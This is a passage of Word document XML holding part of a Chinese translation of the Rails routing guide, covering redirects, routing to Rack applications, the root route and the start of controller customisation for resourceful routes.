              <w:jc w:val="left"/>
              <w:divId w:val="1157267131"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>match '*pages'</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'pages#show', :format</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5E92160C"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3.12 重定向</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2564C13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你可以在路由规则中通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>redirect</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 指定一个路径重定向到另一个路由中的路径：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4776"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="3492339B" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="25547827" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1370061992"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>match "/stories"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; redirect("/posts")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="67D2871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你同样可以把一条 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>match</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 命令中的动态部分的错误处理（rescue）进行重定向：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6456"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="645E9103" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="12947524" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1802771490"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>match "/stories/:name"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; redirect("/posts/%{name}")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1AEDFD0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你同样可以为你的重定向函数加入一个代码块，代码块接收的变量是 params 和 请求对象（后者是可选的）：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="7677E58F" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="370FCBD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match "/stories/:name"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; redirect {|params| "/posts/#{params[:name].pluralize}"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="740B744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match "/stories"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; redirect {|p, req| "/posts/#{req.subdomain}"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="70AE9A3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请注意，这里的重定向都将是 301 标志 “永久重定向”。在某些浏览器或者代理服务器中这个标识码将会使旧的页面失效。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="755EB57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在这些例子里，如果你事先没有为 Rails 提供一个主机地址，Rails 将会给予当前请求地址进行细节的处理。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D63E0A8"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3.13 Routing to Rack Applications</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BAE6BD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Instead of a String, like </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>"posts#index"</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, which corresponds to the </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>index</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> action in the </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>PostsController</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, you can specify any </w:t>
      </w:r>
      <w:hyperlink r:id="rId397" w:history="1">
        <w:r w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Rack application</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> as the endpoint for a matcher.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4320"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="4D3E41BF" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3D6B0226" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1060255016"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>match "/application.js"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; Sprockets</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="686D235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As long as </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Sprockets</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> responds to </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>call</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and returns a </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>[status, headers, body]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, the router won’t know the difference between the Rack application and an action.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DF18A1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For the curious, </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>"posts#index"</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> actually expands out to </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>PostsController.action(:index)</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, which returns a valid Rack application.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="764C3547"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 xml:space="preserve">3.14 使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>root</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64A4CE3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你可以用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>root</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法来指定 Rails 如何匹配 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>"/"</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 路由：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5256"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="562118D4" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="218803B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root :to</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'pages#main'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A02BD3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root 'pages#main'</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t># shortcut for</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>the above</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4EC26BF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你可以将 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>root</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 规则放在文件的最上方，这样这条规则能第一个进行匹配，因为这恐怕将会是最常用的的规则了。你同样需要删除文件 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>public/index.html</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来让这个规则发挥效用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13B57CC3"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4 定制 Resourceful 的路由规则</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="348012F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虽然通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>resources :posts</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 生成的默认的路由和 Helper 方法给你带来了很大的方便。你可能还是需要从某些时候定制这样的路由规则。 Rails 允许你用某种方法定制或者仅生成部分Helper。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30655F0F"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4.1 指定使用控制器。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BFC928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:controller</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项能够让你选择与 resource 关联的控制器。例如：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5256"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="7C021F30" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="638EE55D" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1620452028"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
